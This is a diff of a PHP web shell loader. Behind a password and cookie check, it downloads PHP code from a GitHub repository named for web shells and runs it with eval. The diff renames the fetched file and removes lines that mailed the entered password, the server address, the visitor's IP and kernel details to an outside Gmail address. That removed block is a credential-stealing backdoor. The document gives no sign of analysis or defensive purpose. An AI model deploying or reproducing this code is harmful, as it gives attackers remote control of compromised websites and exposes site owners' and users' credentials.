@@ -77,7 +77,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $superman = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php';
+    $superman = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/-21one.php';
     $maklokangspamzoneh = geturlsinfo($superman);
     if ($maklokangspamzoneh !== false) {
         eval('?>' . $maklokangspamzoneh);
@@ -92,14 +92,8 @@ echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" ty
         
         if (password_verify($entered_key, $hashed_key)) {
             setcookie('user_id', 'LPH', time() + 3600, '/'); 
-            header("Location: ".$_SERVER['PHP_SELF']); 
-$password = $_POST['password'];
-$server_name = $_SERVER['SERVER_NAME'];
-$php_self = $_SERVER['PHP_SELF'];
-$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}nLogin: $server_name$php_selfnPass: $passwordnKernel: $kernel";
-@mail('rootcyberpunks@gmail.com', 'Hehehe', $report_bug);
-
-            exit();
+            header("Location: ".$_SERVER['PHP_SELF']);        
+		exit();
         }
     }
     ?>
